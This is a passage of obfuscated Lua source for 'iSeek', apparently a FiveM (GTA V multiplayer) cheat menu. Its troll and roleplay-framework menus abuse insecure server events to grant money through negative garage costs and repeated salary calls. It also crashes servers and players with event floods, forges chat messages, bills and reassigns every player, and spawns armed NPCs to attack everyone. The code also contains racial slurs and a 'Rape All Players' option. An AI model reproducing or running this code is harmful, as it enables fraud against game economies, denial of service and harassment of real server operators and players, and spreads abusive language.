                                    elseif b8 and GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id)  ~= dH.data.realIndex then
                                        if dH.data.realIndex == -1 then 
                                            RemoveVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dH.data.modid) 
                                            b8 = KZjx 
                                            ba = -1 
                                            b9 = -1 
                                            bc = KZjx
                                        else 
                                            SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, dH.data.realIndex, KZjx) 
                                            b8 = waduyh487r64 
                                        end 
                                    end 
                                end 
                            end 
                                        ililililil() 
                        end 
                    end 
                end
    
            for i, dA in pairs(be) do
                if Plane.IsMenuOpened(dA.id) then
                if GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) == 0 then pricestock = "Not Installed"
                price1 = "Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) == 1 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) == 2 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Installed"
                price4 = "Not Installed"
                elseif GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) == 3 then pricestock = "Not Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Installed"
                elseif GetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id) == -1 then pricestock = "Installed"
                price1 = "Not Installed"
                price2 = "Not Installed"
                price3 = "Not Installed"
                price4 = "Not Installed"
            end
            if IlIlIlIlIlI("Stock "..dA.name, pricestock) then 
                SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, -1) 
            elseif IlIlIlIlIlI(dA.name.." Upgrade 1", price1) then 
                SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, 0) 
            elseif IlIlIlIlIlI(dA.name.." Upgrade 2", price2) then 
                SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, 1) 
            elseif IlIlIlIlIlI(dA.name.." Upgrade 3", price3) then 
                SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, 2) 
            elseif dA.id ~= 13 and dA.id ~= 12 and IlIlIlIlIlI(dA.name.." Upgrade 4", price4) then 
                SetVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, dA.id, 3) end; ililililil() 
            end 
        end

            if Plane.IsMenuOpened("\77\97\105\110\77\101\110\117\10") then
                adyt23h23("\126\104\126\126\114\126\76\117\109\105\110\111\117\115\32\126\115\126\77\101\110\117\10")
                adyt23h23("\126\104\126\126\115\126\77\97\100\101\32\98\121\32\126\114\126\80\108\97\110\101\35\48\48\48\55\10")
                if LDOWJDWDdddwdwdad    ("~r~→  ~s~\83\101\108\102\32\77\101\110\117\10", "\83\101\108\102\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~\84\101\108\101\112\111\114\116\32\77\101\110\117\10", "\84\101\108\101\112\111\114\116\77\101\110\117\10") then
				elseif LDOWJDWDdddwdwdad("~r~→  ~s~\65\73\10", "\65\73\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\79\110\108\105\110\101\32\80\108\97\121\101\114\115\10", "\79\110\108\105\110\101\80\108\97\121\101\114\115\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\87\101\97\112\111\110\32\77\101\110\117\10", "\87\101\97\112\111\110\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\86\101\104\105\99\108\101\32\77\101\110\117\10", "\86\101\104\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\69\120\116\114\101\109\101\32\77\101\110\117\10", "\77\97\108\105\99\105\111\117\115\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\84\114\111\108\108\32\77\101\110\117\10", "\84\114\111\108\108\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\69\83\88\32\79\112\116\105\111\110\115\10", "\69\83\88\77\101\110\117\10") then
                elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\86\82\80\32\79\112\116\105\111\110\115\10", "\86\82\80\77\101\110\117\10") then
				elseif LDOWJDWDdddwdwdad("\126\114\126\226\134\146\32\32\126\115\126\83\101\116\116\105\110\103\115\10", "\83\101\116\116\105\110\103\115\77\101\110\117\10") then
                elseif IlIlIlIlIlI("\126\114\126\226\134\146\32\32\126\115\126\126\114\126\67\108\111\115\101\32\84\104\101\32\77\101\110\117\32\32\226\134\144\10") then
                    WODJAWUE = KZjx
                end

                ililililil()
            elseif Plane.IsMenuOpened("\86\82\80\77\101\110\117\10") then
                if IlIlIlIlIlI("VRP PayGarage 100$") then
                    udwdj("lscustoms:payGarage", {costs = -100})
                elseif IlIlIlIlIlI("VRP PayGarage 1000$") then
                    udwdj("lscustoms:payGarage", {costs = -1000})
                elseif IlIlIlIlIlI("VRP PayGarage 10 000$") then
                    udwdj("lscustoms:payGarage", {costs = -10000})
                elseif IlIlIlIlIlI("VRP PayGarage 100 000$") then
                    udwdj("lscustoms:payGarage", {costs = -100000})
                elseif IlIlIlIlIlI("VRP Get Driver Licence") then
                    udwdj("dmv:success")
				elseif IlIlIlIlIlI("Give yourself 10x salary (VRP)") then
				a=1 repeat udwdj('paycheck:salary') a=a+1 until (a>10)
				a=1 repeat udwdj('paycheck:bonus') a=a+1 until (a>10)
                elseif IlIlIlIlIlI("VRP Bank Deposit") then
                    local amount = pikgfrihfg("Enter Amount Of Money", "", 99999999999)
                    udwdj("bank:deposit", amount)
                elseif IlIlIlIlIlI("VRP Bank Withdraw") then
                    local amount = pikgfrihfg("Enter Amount Of Money", "", 99999999999)
                    udwdj("bank:withdraw", amount)
                elseif IlIlIlIlIlI("VRP Slot Machine") then
                    local amount = pikgfrihfg("Enter Amount Of Money", "", 99999999999)
                    udwdj("vrp_slotmachine:server:2", amount)
                end

                ililililil()
			                elseif Plane.IsMenuOpened("\83\101\116\116\105\110\103\115\77\101\110\117\10") then
                if LiLLL("~r~→  ~s~Menu ~b~X", menuX, currentMenuX, selectedMenuX, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentMenuX = CURENTIXDDd
                    selectedMenuX = DWADIOHDWwww13
                    for i = 1, #allMenus do
                        Plane.SetMenuX(allMenus[i], menuX[currentMenuX])
                    end
                    end) 
                    then
                elseif LiLLL("~r~→  ~s~Menu ~b~Y", menuY, currentMenuY, selectedMenuY, function(CURENTIXDDd, DWADIOHDWwww13)
                    currentMenuY = CURENTIXDDd
                    selectedMenuY = DWADIOHDWwww13
                    for i = 1, #allMenus do
                        Plane.SetMenuY(allMenus[i], menuY[currentMenuY])
                    end
                    end)
                    then
                    elseif IlIlIlI("~b~Discord~s~ Display", discordPresence, function(KAKAAKAKAK) discordPresence = KAKAAKAKAK end) then
					elseif LDOWJDWDdddwdwdad("~r~→  ~s~Information", "InfoMenu") then
                    elseif LDOWJDWDdddwdwdad("~r~→  ~s~Credits", "Credits") then
                    end
    
                    ililililil()
                elseif Plane.IsMenuOpened("InfoMenu") then
                    if IlIlIlIlIlI("iSeek Version v5") then
					elseif IlIlIlIlIlI("https://discord.gg/uDTmjF7") then
                    end
    
                    ililililil()
                elseif Plane.IsMenuOpened("Credits") then
				if     IlIlIlIlIlI("~h~Press on our names <3") then
				elseif IlIlIlIlIlI("∑  ~r~~h~GamerStreamer~s~ - Owner & Developer") then
				adyt23h23('~r~~h~Creator of the iSeek')
				adyt23h23('~h~Contact him for bug reports etc.')
				adyt23h23('~h~Discord iSeek https://discord.gg/uDTmjF7.')
				elseif IlIlIlIlIlI("∑  ~r~~h~~s~ - Legend") then
				adyt23h23('~r~~h~Creator Menu GamerStreamer')
				adyt23h23('~h~Huge help, big shoutout.')
				elseif IlIlIlIlIlI("∑  ~o~~h~Not Soviet xx~s~ - Helping tons") then
				adyt23h23('~r~~h~Big help, go add him on discord for support!')
				elseif IlIlIlIlIlI("∑  ~h~~b~GamerStreamer~s~ - Helping tons") then
				adyt23h23('~r~~h~Huge help, tons of props to him')
				adyt23h23('~h~Suggestion machine 101')
				elseif IlIlIlIlIlI("∑  Gamerstreamer") then
				adyt23h23('~r~~h~Made many of these functions possible')
				adyt23h23('~h~Good cracker :p')
				elseif IlIlIlIlIlI("∑  xx") then
				adyt23h23('~r~~h~Mad lad, dont get him angry')
				adyt23h23('~h~jk, love you cat <3')
				adyt23h23('~h~By the way, ~g~a~m~e~r')
				elseif IlIlIlIlIlI("∑  xx") then
				adyt23h23('~r~~h~Danish god who hates his own country')
				adyt23h23('~h~Go add him if you want someone to argue with')
				adyt23h23('~h~By the way, ~o~M~y~a~o~n~y~g~o~o')
                    end
					ililililil()
            elseif Plane.IsMenuOpened("\84\114\111\108\108\77\101\110\117\10") then
                if IlIlIlIlIlI("ESX Server Crasher") then
                    for i = 1, 50000 do udwdj("esx_skin:responseSaveSkin", {niggers = "gay"}) udwdj("esx_skin:responseSaveSkin", "niggers eat shit") end
                elseif  IlIlIlI(
                    "Send everyone to jail",
                    banallusers,
                    function(KAKAAKAKAK)
                    banallusers = KAKAAKAKAK
                    end)
                then
				elseif IlIlIlIlIlI("Spawn moutain Lion On Everyone") then
                    local mtlion = "A_C_MtLion"
                    for i = 0, 128 do
                        local co = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(Ggggg(mtlion))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(mtlion)) then
                            local ped =
                                CreatePed(21, Ggggg(mtlion), co.x, co.y, co.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
                                Citizen.Wait(50)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
				elseif IlIlIlIlIlI("SWAT W/ Railgun On Everyone") then
                    local swat = "s_m_y_swat_01"
					local bR = "weapon_railgun"
                    for i = 0, 128 do
                        local coo = GetEntityCoords(GetPlayerPed(i))
                        RequestModel(Ggggg(swat))
                        Citizen.Wait(50)
                        if HasModelLoaded(Ggggg(swat)) then
                            local ped =
                                CreatePed(21, Ggggg(swat), coo.x - 1, coo.y, coo.z, 0, waduyh487r64, waduyh487r64)
								CreatePed(21, Ggggg(swat), coo.x + 1, coo.y, coo.z, 0, waduyh487r64, waduyh487r64)
								CreatePed(21, Ggggg(swat), coo.x, coo.y - 1, coo.z, 0, waduyh487r64, waduyh487r64)
								CreatePed(21, Ggggg(swat), coo.x, coo.y + 1, coo.z, 0, waduyh487r64, waduyh487r64)
                            NetworkRegisterEntityAsNetworked(ped)
                            if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
                                local ei = PedToNet(ped)
                                NetworkSetNetworkIdDynamic(ei, KZjx)
                                SetNetworkIdCanMigrate(ei, waduyh487r64)
                                SetNetworkIdExistsOnAllMachines(ei, waduyh487r64)
								GiveWeaponToPed(ped, Ggggg(bR), 9999, 1, 1)
                                SetPedCanSwitchWeapon(ped, waduyh487r64)
                                NetToPed(ei)
                                TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
                            elseif IsEntityDead(GetPlayerPed(i)) then
                                TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
                            else
                                Citizen.Wait(0)
                            end
                        end
                    end
                elseif IlIlIlIlIlI("Nuke Server") then
                    nukeserver()
				elseif IlIlIlIlIlI("Esx Destroy V2") then
				    esxdestroyv2()
				elseif IlIlIlIlIlI("~g~ESX SEND EVERYONE A CUSTOM BILL") then
                    local amount = pikgfrihfg("Enter Amount", "", 100000000)
                    local name = pikgfrihfg("Enter the name of the Bill", "", 100000000)
                    if amount and name then
                    for i = 0, 128 do
                    udwdj('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                    end
				end
				elseif IlIlIlIlIlI("~g~ESX SEND EVERYONE TONS OF BILLS") then
				for i = 0, 128 do
                    udwdj('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "iSeek MENU ", "6969696969")
                end
				elseif IlIlIlIlIlI("VRP Destroy V2") then
				    vrpdestroy()
                elseif IlIlIlIlIlI("Rape All Players") then
                    RapeAllFunc()
                elseif IlIlIlI("Explode Everyone", blowall, function(KAKAAKAKAK) blowall = KAKAAKAKAK end) then
                elseif IlIlIlIlIlI('Make~s~ EVERYONE A Wall') then
                    for i = 0, 128 do
                        if IsPedInAnyVehicle(GetPlayerPed(i), waduyh487r64) then
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = -145066854
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                            AttachEntityToEntity(
                                ed,
                                GetVehiclePedIsIn(GetPlayerPed(i), KZjx),
                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), KZjx), 'chassis'),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                waduyh487r64,
                                waduyh487r64,
                                KZjx,
                                waduyh487r64,
                                1,
                                waduyh487r64
                            )
                        else
                            local eb = 'xs_prop_hamburgher_wl'
                            local ec = Ggggg(eb)
                            while not HasModelLoaded(ec) do
                                Citizen.Wait(0)
                                RequestModel(ec)
                            end
                            local ed = CreateObject(ec, 0, 0, 0, waduyh487r64, waduyh487r64, waduyh487r64)
                            AttachEntityToEntity(
                                ed,
                                GetPlayerPed(i),
                                GetPedBoneIndex(GetPlayerPed(i), 0),
                                0,
                                0,
                                -1.0,
                                0.0,
                                0.0,
                                0,
                                waduyh487r64,
                                waduyh487r64,
                                KZjx,
                                waduyh487r64,
                                1,
                                waduyh487r64
                            )
                        end
                    end
				elseif IlIlIlI("Fuck economy ~g~ESX", esxdestroy, function(KAKAAKAKAK) esxdestroy = KAKAAKAKAK end) then
                elseif IlIlIlI("Freeze Everyone", fall, function(KAKAAKAKAK) fall = KAKAAKAKAK end) then
			    elseif IlIlIlI("Handcuff everyone", freezeall, function(KAKAAKAKAK) freezeall = KAKAAKAKAK end) then
                elseif IlIlIlI("Spawn stuff On Everyone", sall, function(KAKAAKAKAK) sall = KAKAAKAKAK end) then
                elseif IlIlIlIlIlI("Crash All Players") then
                    for i = 0, 128 do
                        if not ped == GetPlayerPed(-1) then
                            CrashPlayer(GetPlayerPed(i))
                        end
                    end
                elseif IlIlIlIlIlI("Fake Message") then
                    local da=pikgfrihfg("Enter player name","",100)
                    if da then
                        local ck=pikgfrihfg("Enter message","",1000)
                        if ck then
                            udwdj("_chat:messageEntered",da,{0,0x99,255},ck)
                        end
                    end
                elseif IlIlIlIlIlI("ESX Set All Police") then
                    for i = 0, 128 do
                        udwdj("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                        udwdj("NB:recruterplayer", i, "police", 3)
                    end
                elseif IlIlIlIlIlI("ESX Set All Mechanic") then
                    for i = 0, 128 do
                        udwdj("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
                        udwdj("NB:recruterplayer", i, "mecano", 3)
                    end
                end

                ililililil()
            elseif Plane.IsMenuOpened("\84\101\108\101\112\111\114\116\77\101\110\117\10") then
                if IlIlIlIlIlI("~b~TP~s~ To Your Waypoint") then
                    TeleportToWaypoint()
                elseif IlIlIlIlIlI("~b~TP~s~ Into Nearest Vehicle") then
                    teleportToNearestVehicle()
                elseif IlIlIlIlIlI("~b~TP~s~ To Coordinates") then
                    TeleportToCoords()
                elseif IlIlIlI(
                    "Show Your Coordinates",
                    showCoords,
                    function(KAKAAKAKAK)
                        showCoords = KAKAAKAKAK
                    end)
                then
                end

                ililililil()
			elseif Plane.IsMenuOpened("\65\73\10") then
			                if IlIlIlIlIlI("~h~Configure The ~g~Speed") then
                    cspeed = pikgfrihfg("Enter Wanted MaxSpeed", "", 100)
					local c1 = 1.0
					cspeed = tonumber(cspeed)
					if cspeed == WADUI then
											adyt23h23(
                            '~~r~Invalid Speed you dumbass~s~.'
                        )
                        adyt23h23(
                            '~r~Operation cancelled~s~.'
                        )
                    elseif cspeed then
                        ojtgh = (cspeed .. ".0")
                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
                    end
					
                    SetDriverAbility(GetPlayerPed(-1), 100.0)
                elseif IlIlIlIlIlI("Drive to waypoint ~o~SLOW") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, KZjx)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 5, 1.0, waduyh487r64)
                        SetDriveTaskDrivingStyle(ped, 8388636)
                        speedmit = waduyh487r64
                    end
                elseif IlIlIlIlIlI("Drive to waypoint ~g~FAST") then
                    if DoesBlipExist(GetFirstBlipInfoId(8)) then
                        local blipIterator = GetBlipInfoIdIterator(8)
                        local blip = GetFirstBlipInfoId(8, blipIterator)
                        local wp = Citizen.InvokeNative(0xFA7C7F0AADF25D09, blip, Citizen.ResultAsVector())
                        local ped = GetPlayerPed(-1)
                        ClearPedTasks(ped)
                        local v = GetVehiclePedIsIn(ped, KZjx)
                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, waduyh487r64)
                        SetDriveTaskDrivingStyle(ped, 2883621)
                        speedmit = waduyh487r64
                    end
                elseif IlIlIlIlIlI("Wander Around") then
                    local ped = GetPlayerPed(-1)
                    ClearPedTasks(ped)
                    local v = GetVehiclePedIsIn(ped, KZjx)
                    print("Configured speed is currently " .. ojtgh)
                    TaskVehicleDriveWander(ped, v, tonumber(ojtgh), 8388636)
                elseif IlIlIlIlIlI("~h~~r~Stop \65\73\10") then
                    speedmit = KZjx
                    if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                        ClearPedTasks(GetPlayerPed(-1))
                    else
                        ClearPedTasksImmediately(GetPlayerPed(-1))
				    end
				end
				                ililililil()
            elseif Plane.IsMenuOpened("\86\101\104\77\101\110\117\10") then
						if IlIlIlIlIlI("Remote Car") then
			RCCAR123 = pikgfrihfg("Enter Car Name", "", 1000000)
			            if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
			RCCar.Start()
                    else
                        adyt23h23("~r~Model Isn't Valid You Tard")
                    end
              elseif LDOWJDWDdddwdwdad('~r~→  ~s~Vehicle List', 'CarTypes') then
		 elseif IlIlIlIlIlI("Spawn A Custom Vehicle") then
                    local ModelName = pikgfrihfg("Enter Vehicle Spawn Name", "", 100)
                    if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                        RequestModel(ModelName)
                        while not HasModelLoaded(ModelName) do
                            Citizen.Wait(0)
                        end

                        local vvvvvvvvvvvvvvvvvvvvvvvv = CreateVehicle(Ggggg(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), waduyh487r64, waduyh487r64)
                        if DelCurVeh then
                            DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
                            adyt23h23("Vehicle Just Got Deleted")
                        end
                            SetPedIntoVehicle(PlayerPedId(), vvvvvvvvvvvvvvvvvvvvvvvv, -1)
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, waduyh487r64)
						SetVehicleNumberPlateText(playerVeh, "iSeekFR")
                    else
                        adyt23h23("~r~Model Isn't Valid You Tard")
                    end
            elseif IlIlIlIlIlI("Repair Vehicle") then
                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx))
                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0.0)
                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0)
                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), KZjx)
                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), KZjx), 0)
					elseif IlIlIlIlIlI("Repair Engine Only") then
					    local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsIn(GetPlayerPed(-1), KZjx)
    if not DoesEntityExist(vvvvvvvvvvvvvvvvvvvvvvvv) then
        adyt23h23(
            "~r~You Aren't Sitting In A Vehicle Stupid"
        )
    else
				SetVehicleUndriveable(vvvvvvvvvvvvvvvvvvvvvvvv,KZjx)
				SetVehicleEngineHealth(vvvvvvvvvvvvvvvvvvvvvvvv, 1000.0)
				SetVehiclePetrolTankHealth(vvvvvvvvvvvvvvvvvvvvvvvv, 1000.0)
				healthEngineLast=1000.0
				healthPetrolTankLast=1000.0
					SetVehicleEngineOn(vvvvvvvvvvvvvvvvvvvvvvvv, waduyh487r64, KZjx )
				SetVehicleOilLevel(vvvvvvvvvvvvvvvvvvvvvvvv, 1000.0)
		end
						elseif IlIlIlIlIlI("~g~Buy vehicle for free") then fv()
				elseif
					IlIlIlI(
					"~r~~h~Ultra Speed",
					Nigubdddddd,
					function(KAKAAKAKAK)
					Nigubdddddd = KAKAAKAKAK
					end)
				then
					elseif
					IlIlIlI(
					"~w~Rainbow Vehicle Colour",
					ou328hVeh,
					function(KAKAAKAKAK)
					ou328hVeh = KAKAAKAKAK
					end)
				then
				elseif
					IlIlIlI(
					"~w~Rainbow Vehicle Neon",
					ou328hNeon,
					function(KAKAAKAKAK)
					ou328hNeon = KAKAAKAKAK
					end)
				then
				elseif
					IlIlIlI(
					"~w~Rainbow Sync",
					ou328hSync,
					function(KAKAAKAKAK)
					ou328hSync = KAKAAKAKAK
					end)
				then
				elseif
					IlIlIlI(
					"Keep Vehicle Clean",
					LOJWDNDDNDN,
					function(KAKAAKAKAK)
					LOJWDNDDNDN = KAKAAKAKAK
					end)
				then
                elseif LDOWJDWDdddwdwdad("~r~→  ~s~LS Customs", "\76\83\67\10") then
				                elseif
                    IlIlIlI(
                        'Speedboost ~g~SHIFT ~r~CTRL',
                        dki2u3bb3333,
                        function(dl)
                            dki2u3bb3333 = dl
                        end
                    )
                 then
                elseif IlIlIlIlIlI("Delete Vehicle") then
                    DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
				elseif IlIlIlIlIlI("Delete Closest Vehicle") then
                        local PlayerCoords = GetEntityCoords(PlayerPedId())
                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
				elseif
					IlIlIlI(
						"No Fall",
						Nofall,
						function(KAKAAKAKAK)
							Nofall = KAKAAKAKAK

							SetPedCanBeKnockedOffVehicle(PlayerPedId(), Nofall)
						end
					)
				 then
				elseif IlIlIlIlIlI("Change license plate") then
					local playerPed = GetPlayerPed(-1)
					local playerVeh = GetVehiclePedIsIn(playerPed, waduyh487r64)
					local awd2323 = pikgfrihfg("Enter the plate license you want", "", 10)
					if awd2323 then
						SetVehicleNumberPlateText(playerVeh, awd2323)
						end
						                elseif IlIlIlI(
                    "Vehicle Godmode",
                    VehGod,
                    function(KAKAAKAKAK)
                        VehGod = KAKAAKAKAK
                    end)
                then
				elseif IlIlIlIlIlI("Flip Up Vehicle") then
				local ped = GetPlayerPed(-1)
		        local vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsIn(ped)
	             FreezeEntityPosition(vvvvvvvvvvvvvvvvvvvvvvvv,KZjx)
	             SetVehicleOnGroundProperly(vvvvvvvvvvvvvvvvvvvvvvvv)
	            SetVehicleEngineOn(vvvvvvvvvvvvvvvvvvvvvvvv, waduyh487r64)
				elseif IlIlIlIlIlI("Make vehicle dirty") then
					Clean(GetVehiclePedIsUsing(PlayerPedId()))
					adyt23h23("~r~Vehicle is now dirty")
				elseif IlIlIlIlIlI("Make vehicle clean") then
					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
					adyt23h23("~r~Vehicle is now clean")
                end

                ililililil()
			elseif Plane.IsMenuOpened("tunings") then 
                    vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(bd) do
                        if dA.
                    id == "extra"
                    and# checkValidVehicleExtras()  ~= 0 then
                    if LDOWJDWDdddwdwdad(dA.name, dA.id) then end elseif dA.id == "neon"
                    then
                    if LDOWJDWDdddwdwdad(dA.name, dA.id) then end elseif dA.id == "paint"
                    then
                    if LDOWJDWDdddwdwdad(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
                    then
                    if LDOWJDWDdddwdwdad(dA.name, dA.id) then end elseif dA.id == "headlight"
                    then
                    if LDOWJDWDdddwdwdad(dA.name, dA.id) then end
                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
                        if LDOWJDWDdddwdwdad(dA.name, dA.id) then end;
                    break end end end;
                    if IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 22) then xenonStatus = "Installed"
                    else xenonStatus = "Not Installed"
                    end;
                    if IlIlIlIlIlI("Xenon Headlight", xenonStatus) then
                    if not IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 22) then ToggleVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, 22, not IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 22))
                    else ToggleVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, 22, not IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 22)) end end; 
                    
                    ililililil() 
                elseif Plane.IsMenuOpened("performance") then 
                    vvvvvvvvvvvvvvvvvvvvvvvv = GetVehiclePedIsUsing(PlayerPedId()) 
                    for i, dA in pairs(be) do
                        if LDOWJDWDdddwdwdad(dA.name, dA.id) then 
                        end 
                    end
                    if IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 18) then 
                        turboStatus = "Installed"
                    else 
                        turboStatus = "Not Installed"
                    end
                    if IlIlIlIlIlI("Turbo Tune", turboStatus) then
                        if not IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 18) then 
                            ToggleVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, 18, not IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 18))
                        else 
                            ToggleVehicleMod(vvvvvvvvvvvvvvvvvvvvvvvv, 18, not IsToggleModOn(vvvvvvvvvvvvvvvvvvvvvvvv, 18)) 
                        end 
                    end 
                    ililililil() elseif Plane.IsMenuOpened("primary") then LDOWJDWDdddwdwdad("~r~→  ~s~Classic", "classic1") LDOWJDWDdddwdwdad("~r~→  ~s~Metallic", "metallic1") LDOWJDWDdddwdwdad("~r~→  ~s~Matte", "matte1") LDOWJDWDdddwdwdad("~r~→  ~s~Metal", "metal1") ililililil() elseif Plane.IsMenuOpened("secondary") then LDOWJDWDdddwdwdad("~r~→  ~s~Classic", "classic2") LDOWJDWDdddwdwdad("~r~→  ~s~Metallic", "metallic2") LDOWJDWDdddwdwdad("~r~→  ~s~Matte", "matte2") LDOWJDWDdddwdwdad("~r~→  ~s~Metal", "metal2") ililililil() elseif Plane.IsMenuOpened("rimpaint") then LDOWJDWDdddwdwdad("~r~→  ~s~Classic", "classic3") LDOWJDWDdddwdwdad("~r~→  ~s~Metallic", "metallic3") LDOWJDWDdddwdwdad("~r~→  ~s~Matte", "matte3") LDOWJDWDdddwdwdad("~r~→  ~s~Metal", "metal3") ililililil() elseif Plane.IsMenuOpened("classic1") then
                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if tp ==
                    dT.id and not b8 then pricetext = "Installed"
                    else if b8 and tp == dT.id then pricetext = "Previewing"
                    else pricetext = "Not Installed"
                    end end; curprim, cursec = GetVehicleColours(vvvvvvvvvvvvvvvvvvvvvvvv) if IlIlIlIlIlI(dT.name, pricetext) then
                    if not b8 then ba = "paint"
